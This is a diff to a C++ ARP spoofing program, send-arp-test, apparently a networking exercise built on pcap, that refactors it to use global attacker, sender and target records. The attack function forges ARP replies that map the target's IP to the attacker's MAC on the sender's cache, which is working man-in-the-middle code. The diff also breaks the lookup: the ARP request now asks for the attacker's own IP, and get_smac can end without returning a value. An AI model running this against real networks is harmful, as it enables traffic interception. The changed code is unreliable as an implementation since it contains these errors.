@@ -5,7 +5,7 @@ void usage() {
     printf("sample: send-arp-test wlan0\n");
 }
 
-void get_myinfo(char* interface, Mac& mymac, Ip& myip){
+void get_myinfo(char* interface){
     // Reference: https://pencil1031.tistory.com/66
     uint8_t mac[6];
     char ip[40];
@@ -38,15 +38,15 @@ void get_myinfo(char* interface, Mac& mymac, Ip& myip){
 
     close(sock);
 
-    mymac = Mac(mac);
-    myip = Ip(ip);
+    attacker.mac = Mac(mac);
+    attacker.ip = Ip(ip);
 }
 
-void get_smac(pcap_t* handle, Mac& smac, Ip& sip, Ip& myip, Mac& mymac){
+Mac get_smac(pcap_t* handle){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac::broadcastMac();
-    packet.eth_.smac_ = mymac;
+    packet.eth_.smac_ = attacker.mac;
 
     packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -55,10 +55,10 @@ void get_smac(pcap_t* handle, Mac& smac, Ip& sip, Ip& myip, Mac& mymac){
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = mymac;
-    packet.arp_.sip_ = htonl(myip);
+    packet.arp_.smac_ = attacker.mac;
+    packet.arp_.sip_ = htonl(attacker.ip);
     packet.arp_.tmac_ = Mac::nullMac();
-    packet.arp_.tip_ = htonl(sip);
+    packet.arp_.tip_ = htonl(attacker.ip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -78,19 +78,17 @@ void get_smac(pcap_t* handle, Mac& smac, Ip& sip, Ip& myip, Mac& mymac){
         EthArpPacket* reply = (EthArpPacket*)packet;
         if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
         if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
-        if (ntohl(reply->arp_.sip_) != sip) continue;
+        if (ntohl(reply->arp_.sip_) != sender.ip) continue;
 
-        smac = Mac(reply->arp_.smac_);;
-        printf("Sender MAC: %s\n", std::string(smac).c_str());
-        break;
+        return Mac(reply->arp_.smac_);
     }
 }
 
-void attack(pcap_t* handle, Mac& mymac, Ip& tip, Mac& smac, Ip& sip){
+void attack(pcap_t* handle){
     EthArpPacket packet;
 
-    packet.eth_.dmac_ = smac;
-    packet.eth_.smac_ = mymac;
+    packet.eth_.dmac_ = sender.mac;
+    packet.eth_.smac_ = attacker.mac;
 
     packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -99,15 +97,14 @@ void attack(pcap_t* handle, Mac& mymac, Ip& tip, Mac& smac, Ip& sip){
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.smac_ = mymac;
-    packet.arp_.sip_ = htonl(tip);
-    packet.arp_.tmac_ = smac;
-    packet.arp_.tip_ = htonl(sip);
+    packet.arp_.smac_ = attacker.mac;
+    packet.arp_.sip_ = htonl(target.ip);
+    packet.arp_.tmac_ = sender.mac;
+    packet.arp_.tip_ = htonl(sender.ip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         exit(-1);
     }
-    printf("Attack Success\n");
 }
